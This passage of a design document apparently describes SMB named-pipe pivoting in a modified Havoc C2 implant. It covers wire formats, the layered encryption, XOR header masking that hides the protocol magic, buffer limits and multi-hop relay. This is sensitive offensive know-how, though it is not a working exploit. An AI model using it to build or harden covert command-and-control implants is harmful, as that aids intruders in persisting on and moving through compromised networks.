[Loop back to sleep]
```

The child's output is **not forwarded in real time** — it is batched into the parent's next HTTP checkin after the child writes to the pipe and `PivotPush` drains it. The effective latency for child output to reach the teamserver is:

```
child_sleep + parent_sleep + network_RTT
```

### Disconnect detection

If `PeekNamedPipe` fails with `ERROR_BROKEN_PIPE`, the parent:
1. Calls `PivotRemove(DemonID)` — closes handle, frees memory
2. Creates and queues `COMMAND_PIVOT / DEMON_PIVOT_SMB_DISCONNECT`
3. Teamserver receives this and calls `teamserver.LinkRemove(parent, child, true)`, marking the child inactive in the UI

---

## 11. Wire Formats at Each Stage

### 11.1 Child → named pipe (child's output, PackageTransmitAll)

```
Offset  Size   Field            Notes
------  -----  ---------------  ----------------------------------------
0       4      SIZE             Big-endian. Bit 31 = LZNT1 flag (HVC-007).
                                Value = (bytes after SIZE) without HMAC tag.
                                NOT masked by HVC-003.
4       4      MAGIC            0xDEADBEEF XOR mask4  (HVC-003)
8       4      AgentID          child's AgentID XOR mask4
12      4      CMD              DEMON_COMMAND_GET_JOB XOR mask4
16      4      REQID            request ID XOR mask4
20      16     RandIV           per-request AES IV (HVC-004), big-endian
36      N      AES payload      AES-256-CTR encrypted; plaintext =
                                 [CMD(4)][REQID(4)][SIZE(4)][data...]
                                 (optionally LZNT1 compressed before encryption)
36+N    32     HMAC-SHA256 tag  over bytes 0..(36+N-1) (HVC-006)
```

`mask4 = (SIZE ^ HEADER_MASK_SEED)` where SIZE is bytes 0-3.

### 11.2 Parent pipe framing written to child's pipe (parent → child, task delivery)

```
Offset  Size   Field            Notes
------  -----  ---------------  ----------------------------------------
0       4      DemonID          ChildAgentID XOR HEADER_MASK_SEED (HVC-008)
4       4      PackageSize      Payload byte count XOR (HEADER_MASK_SEED>>8) (HVC-008)
8       N      Payload          BuildPayloadMessage output:
                                 [CMD(4)][REQID(4)][EncLen(4)][AES data]
                                 encrypted with child's AES key+staticIV
                                 (no per-request IV, no HMAC)
```

### 11.3 Parent → teamserver (HTTP, wrapping child output)

The parent's `PackageTransmitAll` wraps everything in its own wire format (same as §11.1 but using the **parent's** AES key). The child's `AuthWireBuffer` appears as opaque bytes inside the `COMMAND_PIVOT/DEMON_PIVOT_SMB_COMMAND` data field of the parent's encrypted payload.

```
[Parent outer wire format (HVC-003/004/006/007 with parent's key)]
    └─ Decrypted payload contains:
        [COMMAND_PIVOT(4)] [REQID(4)]
        [DEMON_PIVOT_SMB_COMMAND(4)]
        [ChildPacketLen(4)]
        [Child AuthWireBuffer — child's full §11.1 wire format]
```

### 11.4 Teamserver → parent (HTTP response, task for child)

The parent's HTTP response contains the parent's tasks encrypted with the parent's key. Among those tasks is the pivot delivery job:

```
[Parent response BuildPayloadMessage]
    [COMMAND_PIVOT(4)] [REQID(4)] [DataLen(4)]
    [AES-encrypted with parent's key]:
        [DEMON_PIVOT_SMB_COMMAND(4)]
        [ChildAgentID(4)]
        [FrameLen(4)]
        [ChildAgentID(4)]   <-- this is Packer.Buffer() content
        [ChildPayloadLen(4)]
        [ChildPayload = BuildPayloadMessage with child's key]
```

After the parent decrypts with its own key, `CommandPivot` sees `[ChildAgentID][ChildPayloadLen][ChildPayload]` and applies HVC-008 masking before writing to the pipe.

---

## 12. Encryption Pipeline

### 12.1 Direction: Child Demon → Teamserver

Applied in `PackageTransmitAll`, then relayed by parent:

| Step | Operation | Applied by |
|------|-----------|-----------|
| 1 | LZNT1 compress if >256 bytes; set bit 31 of SIZE (HVC-007) | `Package.c` |
| 2 | AES-256-CTR encrypt with fresh random IV (HVC-004) | `Package.c` |
| 3 | XOR mask bytes 4-19 of header: `mask = SIZE ^ 0xA3F1C2B4` (HVC-003) | `Package.c` |
| 4 | HMAC-SHA256 over full masked wire buffer (HVC-006) | `Package.c` |
| 5 | HVC-008 pipe framing mask NOT applied here; only parent→child framing uses HVC-008 | N/A |

Teamserver strips in reverse: HMAC verify → HVC-003 unmask → parse header → IV extract → AES decrypt → HVC-007 decompress.

### 12.2 Direction: Teamserver → Child (via parent relay)

| Step | Operation | Applied by |
|------|-----------|-----------|
| 1 | Encrypt with child's AES key, static IV (no per-request IV) | `BuildPayloadMessage` (Go) |
| 2 | No HMAC | N/A |
| 3 | No header masking in the child-payload itself | N/A |
| 4 | HVC-008 applied to `[ChildAgentID][PayloadLen]` framing fields | `CommandPivot` (C) |
| 5 | Entire buffer delivered via parent's pipe handle | `PipeWrite` (C) |

Child strips: HVC-008 unmask → read PayloadLen → read payload → AES-256-CTR decrypt with static IV (`ParserDecrypt`).

### 12.3 Key material lifecycle

```
[Child DemonInit]
   Instance->Config.AES.Key ← randomly generated (if NULL) or config-provided
   Instance->Config.AES.IV  ← randomly generated (if NULL) or config-provided

[DemonMetaData (HVC-005)]
   48 bytes key material = [AES.Key (32)] || [AES.IV (16)]
   Encrypted with teamserver's RSA-2048-OAEP-SHA256 public key
   Embedded in registration packet as 256-byte RSA ciphertext

[Teamserver ParseDemonRegisterRequest]
   RSA decrypt 256-byte ciphertext → 48 bytes
   Agent.Encryption.AESKey = bytes[0:32]
   Agent.Encryption.AESIv  = bytes[32:48]

[Runtime]
   Child uses static Key+IV for both directions (with fresh random IV only for outbound)
   Parent cannot read child traffic (different keys, never shared)
   Teamserver has the ground truth keys for each child from registration
```

### 12.4 HMAC key derivation (HVC-006)

```
macKey = HMAC-SHA256(AES_key, "mac")     // 32-byte derived key
tag    = HMAC-SHA256(macKey, wire_buf)   // over the masked wire buffer
```

For SMB pivot delivery (teamserver→child), **no HMAC is applied**. Only the Demon→teamserver direction uses HMAC. The parent relay is trusted as an internal IPC boundary.

---

## 13. Buffer Limits and Batching

### 13.1 PIPE_BUFFER_MAX

```c
#define PIPE_BUFFER_MAX 0x10000   // 64 KB  (Transport.h)
```

This is the `CreateNamedPipe` output buffer and input buffer size. Windows named pipe messages cannot exceed this limit without `PIPE_WAIT` + multi-message splitting (which breaks the single-`ReadFile`=one-message guarantee of `PIPE_TYPE_MESSAGE`).

### 13.2 PackageTransmitAll SMB batch guard (BUGFIX-003 BUG-D)

```c
if ( Package->Length + sizeof(UINT32)*3 + Pkg->Length
     + AES_BLOCKLEN + HMAC_SHA256_SIZE > PIPE_BUFFER_MAX )
    break;
```

- `sizeof(UINT32)*3` = 12 bytes: `[CMD][REQID][SIZE]` overhead for each appended sub-package
- `AES_BLOCKLEN` = 16: IV prepended by HVC-004
- `HMAC_SHA256_SIZE` = 32: tag appended by HVC-006
- Maximum usable payload per send = `65536 - 48 = 65488 bytes`

Exceeding this limit causes `AuthWireLength > PIPE_BUFFER_MAX`, which forces two `WriteFile` calls internally. The second `WriteFile` creates a second pipe message (48-byte orphan). `PivotPush`'s `ReadFile` consumes the first message correctly but leaves the 48-byte orphan, which then blocks all future reads on that child's pipe handle.

### 13.3 PackageTransmit single-package guard

```c
if ( sizeof(UINT32)*8 + Package->Length > PIPE_BUFFER_MAX )
    // discard and send DEMON_PACKAGE_DROPPED
```

This protects against a single oversized result (e.g. a huge `ls` output). The `sizeof(UINT32)*8` accounts for the outer framing fields.

### 13.4 MAX_SMB_PACKETS_PER_LOOP

Limits how many packets `PivotPush` drains from a single child's pipe per parent iteration, preventing the parent from getting stuck draining a flood of child output at the expense of its own tasking.

---

## 14. Keepalive and Disconnect Detection

### 14.1 No explicit heartbeat from child

Unlike HTTP (where the Demon sends `GET_JOB` every sleep cycle as an implicit keep-alive), the SMB child has no equivalent. The child loop:

1. Sends queued output (if any) via `PackageTransmitAll`
2. Reads new tasks (if any) via `SMBGetJob`
3. If nothing to send and nothing to receive, loops silently

There is **no periodic ping or keep-alive packet** from child to parent.

### 14.2 Alive confirmation via GET_JOB packet

When the child sends a `PackageTransmitAll` that includes a `GET_JOB` wrapper, the teamserver receives a `COMMAND_GET_JOB` command from the child (relayed via the parent). In the teamserver's `DEMON_PIVOT_SMB_COMMAND` handler:

```go
if Command != COMMAND_GET_JOB {
    PivotAgent.TaskDispatch(...)
} else {
    // Just counts pending pivot jobs for debugging
    // Updates PivotAgent.Info.LastCallIn via UpdateLastCallback()
}
```

`PivotAgent.UpdateLastCallback(teamserver)` is called whenever any packet is received from the child (including GET_JOB), so the "last seen" timestamp in the UI is updated.

### 14.3 Parent-side disconnect detection

The parent detects child disconnection in two places:

**PivotPush** (passive, on each parent iteration):
```c
PeekNamedPipe( TempList->Handle, ... )
// if fails with ERROR_BROKEN_PIPE:
PivotRemove( DemonID );
PackageTransmit( DEMON_PIVOT_SMB_DISCONNECT + Removed + DemonID );
```

**SmbSend BUGFIX-003 BUG-B** (active, on write failure):
```c
if ( ! PipeWrite( ... ) ) {
    SysNtClose( Instance->Config.Transport.Handle );
    Instance->Config.Transport.Handle = NULL;
    Instance->Session.Connected = FALSE;
    return FALSE;
}
```
For the parent's own pipe (as child of its own parent), any write failure forces `Connected = FALSE` which causes `CommandDispatcher` to exit and `DemonRoutine` to attempt `TransportInit` again.

### 14.4 Child-side disconnect detection

The child detects disconnection in `SmbRecv`:

- `PeekNamedPipe` failure → `Connected = FALSE`, return FALSE
- `ReadFile` failure (DemonId or PackageSize) → `Connected = FALSE`, return FALSE
- `LocalAlloc` failure → `Connected = FALSE`, return FALSE
- `PipeRead` failure → `Connected = FALSE`, return FALSE

When `Connected = FALSE`, `CommandDispatcher` breaks its loop, returns to `DemonRoutine`, which calls `SleepObf()` and then tries `TransportInit()` again — recreating the named pipe and waiting for a new parent connection.

---

## 15. Command and Subcommand IDs

### 15.1 Top-level COMMAND_PIVOT

| Constant | Value | Description |
|----------|-------|-------------|
| `DEMON_COMMAND_PIVOT` (C) | 2520 (0x9D8) | Top-level pivot command ID |
| `COMMAND_PIVOT` (Go) | 2520 | Same |

### 15.2 DEMON_PIVOT_* subcommands

| Constant | Value | Direction | Description |
|----------|-------|-----------|-------------|
| `DEMON_PIVOT_LIST` | 1 | Child→TS | List connected pivot children |
| `DEMON_PIVOT_SMB_CONNECT` | 10 | Child→TS | Parent reports new child connected |
| `DEMON_PIVOT_SMB_DISCONNECT` | 11 | Child→TS | Parent reports child disconnected |
| `DEMON_PIVOT_SMB_COMMAND` | 12 | Both | Bidirectional: task delivery (TS→child) and output relay (child→TS) |

### 15.3 Other relevant command IDs

| Constant | Value | Direction | Description |
|----------|-------|-----------|-------------|
| `DEMON_COMMAND_GET_JOB` | 1 | C→TS | Child requests tasks (SMB: sent when child has output; piggybacks GET_JOB) |
| `DEMON_COMMAND_NO_JOB` | 10 | TS→C | Teamserver response: no tasks pending |
| `DEMON_COMMAND_CHECKIN` | 100 | C→TS | Re-registration after reconnect |
| `DEMON_INITIALIZE` / `DEMON_INIT` | 99 | C→TS | Initial registration packet command ID |
| `DEMON_PACKAGE_DROPPED` | 2570 | C→TS | Notify operator: oversized SMB package discarded |

---

## 16. Teamserver-Side Processing

### 16.1 Inbound path (child output arriving via parent)

```
HTTP POST (parent's request)
    │
    ├─ parseAgentRequest()          agents/handlers.go
    │       HVC-006: HMAC verify for known parent agent
    │       ParseHeader: HVC-003 unmask
    │
    ├─ handleDemonAgent()
    │       HVC-004: extract IV, AES decrypt (parent's key)
    │       HVC-007: LZNT1 decompress if compressed
    │       Command loop:
    │           COMMAND_PIVOT → TaskDispatch → DEMON_PIVOT_SMB_COMMAND
    │
    └─ DEMON_PIVOT_SMB_COMMAND handler (demons.go ~5359)
            Probe child header (ParseHeader on copy)
            Strip HMAC tail if child known (HVC-006)
            Full ParseHeader on trimmed bytes (HVC-003 unmask)
            Look up child agent by AgentID
            UpdateLastCallback() on child agent
            HVC-004: extract child's IV, AES decrypt (child's key)
            HVC-007: decompress if bit 31 was set
            Command loop:
                COMMAND_GET_JOB → update last-seen, log queue state
                other → PivotAgent.TaskDispatch(Request, Command, ...)
```

### 16.2 Outbound path (task delivery to child)

```
Operator sends task to child agent (via client UI or script)
    │
    ├─ Agent.AddJobToQueue()        agent.go:677
    │       Pivots.Parent != nil → PivotAddJob()
    │
    ├─ Agent.PivotAddJob()          agent.go:779
    │       BuildPayloadMessage(job, childKey, childIV)
    │       Packer.AddInt32(ChildAgentID)
    │       Packer.AddBytes(Payload)
    │       PivotJob = {COMMAND_PIVOT, DEMON_PIVOT_SMB_COMMAND, AgentID, Packer.Buffer()}
    │       (If multi-hop: wrap PivotJob again for intermediate pivots)
    │       Append to root parent's JobQueue
    │
    └─ Next parent checkin:
            handleDemonAgent returns BuildPayloadMessage(PivotJob, parentKey, parentIV)
            → Parent decrypts → CommandPivot DEMON_PIVOT_SMB_COMMAND
            → HVC-008 mask → PipeWrite to child
            → Child SmbRecv unmask → ParserDecrypt
```

### 16.3 HMAC handling for pivot traffic

| Scenario | HMAC applied? | Notes |
|----------|---------------|-------|
| Child → parent (pipe, outbound) | **Yes** — full HVC-006 tag appended by child's `PackageTransmitAll` | |
| Parent → teamserver (HTTP, outbound) | **Yes** — parent's own HVC-006 wrapping the COMMAND_PIVOT blob | |
| Teamserver → parent (HTTP, inbound) | **No** — `BuildPayloadMessage` does not add HMAC | Authentication implicit |
| Parent → child (pipe, inbound delivery) | **No** — `BuildPayloadMessage` for task delivery has no HMAC | |
| Child re-registration (DEMON_INIT) | **No** — sent via `PackageTransmitNow` which has no HMAC | BUGFIX-004 BUG-B: HMAC check must be skipped for this case |

---

## 17. Multi-Hop Pivot Chains

The system supports arbitrarily deep pivot chains (e.g., HTTP Parent → SMB Child A → SMB Grandchild B).

### 17.1 Teamserver wrapping (PivotAddJob)

For a two-hop chain (TS → Parent → Child A → Grandchild B):

```go
// Wrap grandchild's task for delivery to Child A → Grandchild B
Payload_B = BuildPayloadMessage(job, grandchildB.Key, grandchildB.IV)
Packer_B.AddInt32(grandchildB.AgentID)
Packer_B.AddBytes(Payload_B)
PivotJob_B = {COMMAND_PIVOT, DEMON_PIVOT_SMB_COMMAND, grandchildB.AgentID, Packer_B.Buffer()}

// Wrap PivotJob_B for Child A → grandchild delivery
Payload_A = BuildPayloadMessage(PivotJob_B, childA.Key, childA.IV)
Packer_A.AddInt32(childA.AgentID)
Packer_A.AddBytes(Payload_A)
PivotJob_A = {COMMAND_PIVOT, DEMON_PIVOT_SMB_COMMAND, childA.AgentID, Packer_A.Buffer()}

// Add to Parent's queue
parent.JobQueue = append(parent.JobQueue, PivotJob_A)
```

`PivotAddJob` does this automatically via the `pivots = &pivots.Parent.Pivots` loop.

### 17.2 Demon-side unwrapping

When Child A receives `PivotJob_A`:
1. Decrypts with its own key → gets `PivotJob_B` plaintext
2. `CommandPivot(DEMON_PIVOT_SMB_COMMAND)` extracts `grandchildB.AgentID` and `Packer_B.Buffer()`
3. Applies HVC-008 mask, writes to Grandchild B's pipe handle

When Grandchild B receives:
1. `SmbRecv` unmasks HVC-008 framing
2. Reads `Payload_B` (`BuildPayloadMessage` output)
3. `CommandDispatcher` decrypts with grandchild's key → task args

### 17.3 Output path multi-hop

Grandchild B → Child A (pipe) → Parent (pipe) → Teamserver (HTTP)

Each hop:
- Grandchild B: `PackageTransmitAll` → HVC-004/006/003 full pipeline → writes to pipe
- Child A: `PivotPush` reads from grandchild's pipe → wraps in `COMMAND_PIVOT/DEMON_PIVOT_SMB_COMMAND` → `PackageTransmit` → sends to parent's pipe
- Parent: `PivotPush` reads from Child A's pipe → wraps again → `PackageTransmit` → sends to teamserver via HTTP

Teamserver unwraps two nested `DEMON_PIVOT_SMB_COMMAND` layers:
- First unwrap: identifies Child A's `DEMON_PIVOT_SMB_COMMAND`, payload = Grandchild B's `AuthWireBuffer`
- Teamserver calls `ParseHeader` on Grandchild B's packet → identifies as Grandchild B → calls `PivotAgent.TaskDispatch`

---

## 18. Error Handling

### 18.1 Child pipe write failure

In `SmbSend`:
- Any `PipeWrite` failure closes the pipe handle, sets `Connected = FALSE`, returns FALSE
- `PackageTransmitAll` propagates FALSE
- SMB `CommandDispatcher` path does not check return value of `PackageTransmitAll` explicitly — the `Connected = FALSE` from `SmbSend` causes the `do { if (!Connected) break; }` at the top of the loop to exit
- `DemonRoutine` re-enters `TransportInit`, recreates the pipe, waits for parent

### 18.2 Child pipe read failure (SmbRecv)

Any `ReadFile` or `PeekNamedPipe` failure sets `Connected = FALSE`. The dispatcher loop exits, and the child awaits a new connection via `TransportInit`.

### 18.3 Parent pipe write failure (CommandPivot)

```c
if ( ! PipeWrite( PivotData->Handle, &Data ) ) {
    PUTS( "PipeWrite failed" )
    PACKAGE_ERROR_WIN32    // sends error code back to teamserver
}
```
The child's handle remains open; the failure is reported to the operator via a `CALLBACK_ERROR_WIN32` package, but the parent continues running. The child is not immediately removed — it will be detected via `PivotPush`'s `PeekNamedPipe` failure on the next iteration.

### 18.4 Oversized packet discard

For SMB, `PackageTransmit` discards any package whose size exceeds `PIPE_BUFFER_MAX` and substitutes a `DEMON_PACKAGE_DROPPED` notification (command 2570) sent to the teamserver. The operator sees a warning in the UI.

### 18.5 HMAC verification failure for child packets

If the child's HMAC tag does not match, `parseAgentRequest` on the teamserver returns `false`, the HTTP handler sends HTTP 404 to the **parent** (not the child), and the parent's `PackageTransmitAll` may flag a transport error. The child is not directly notified.

For re-registration packets (DEMON_INIT, sent via `PackageTransmitNow` with no HMAC tag), the HMAC check is bypassed by detecting the CMD field = 99 in `parseAgentRequest` (BUGFIX-004 BUG-B).

### 18.6 AES decryption of corrupted data

If `PackageTransmitNow`'s AES-CTR counter is not reset before the reverse-decrypt call (BUGFIX-004 BUG-C), the `MetaData` package buffer is corrupted. Every subsequent reconnect attempt sends garbage; the teamserver's `ParseHeader` fails, returning HTTP 404 permanently. The fix re-initialises `AesCtx` to reset the counter before the second encrypt call.

---

## Summary: SMB Demon vs HTTP Demon

| Feature | HTTP Demon | SMB Demon |
|---------|-----------|-----------|
| Transport | WinHttp TCP to teamserver | Named pipe to parent Demon |
| Task delivery model | Pull (Demon asks for jobs via GET_JOB) | Push (parent writes to child's pipe) |
| Output delivery | Embedded in GET_JOB response handling | PivotPush reads pipe, relays via parent's HTTP |
| Checkin / alive signal | GET_JOB packet every sleep cycle | Implicit: any data on pipe; no dedicated heartbeat |
| Encryption: Demon→TS | HVC-003+004+006+007 (full pipeline) | Same pipeline, via nested wrapping |
| Encryption: TS→Demon | `BuildPayloadMessage` static IV, no HMAC | Same, plus HVC-008 pipe framing mask |
| Direct network access | Required (outbound HTTP/S) | Not required; relies on parent |
| Buffer limit | Governed by HTTP body size | 64 KB per pipe message (PIPE_BUFFER_MAX) |
| Disconnect detection | HostCheckup(), HTTP error codes | PeekNamedPipe ERROR_BROKEN_PIPE in PivotPush |
| Registration handshake | RSA key wrap + AES confirmation reply | RSA key wrap, no confirmation reply to child |
| Multi-hop | N/A | Arbitrary depth via nested COMMAND_PIVOT wrapping |
